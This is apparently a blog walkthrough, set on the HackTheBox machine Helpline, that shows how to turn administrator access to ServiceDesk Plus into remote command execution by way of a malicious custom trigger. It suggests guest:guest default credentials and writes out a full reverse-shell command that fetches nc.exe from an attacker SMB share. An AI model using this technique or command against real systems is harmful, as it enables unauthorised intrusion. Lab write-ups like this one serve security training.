---
layout: post
categories: [Abusing CMSs]
---

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/serviceicon.png">

Today, I'm going to explain how to get **Remote Command Execution** once you have logged in a ServiceDesk Plus as administrator or with privileges.

- This post is the second part of **"Abusing CMS"**

First of all, if you don't have access, you can try some vulnerabilities or the low privileges account, (username:guest password:guest) for trying to gain access.

For the practices I recommend you the *HackTheBox* machine called **Helpline**, in which I exploited it.

The first step is going to **"Admin"** which is at the top of the index.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/service1.png">

Then click on **"Custom Triggers"**.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/service2.png">

Now go to **"Add New Action"**, for creating a malicious trigger that allows you to receive a shell in you attacker machine.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/service3.png">

At this point, you have to fill some blanks with the criteria of the action, in the name section, type "*RCE*" for example, in "*Match the below criteria*" select **Sender**, **not contains** and **test**. In the "*Script file to run*", type your commands, in my case ***cmd /c \\\\10.10.16.6\\smbFolder\\nc.exe -e cmd.exe 10.10.16.6 443*** for connecting to my SMB server, with the nc.exe binary that sends a reverse shell in the port 443 to my machine.

Click on **"Save"**.

<img src ="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/service4.png">

Now you have created the malicious action, but you have to make it run, and for that you must go to "*Requests*" --> "*New Incident*".
Fill the 2 required fields, the name and the subject, with any word except **test** or the word that you have selected above.

And click on **"Add Request"**. Wait a few seconds and if you've done it right, you may receive a reverse shell in your listener.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/main/images/service5.png">

And that's all.
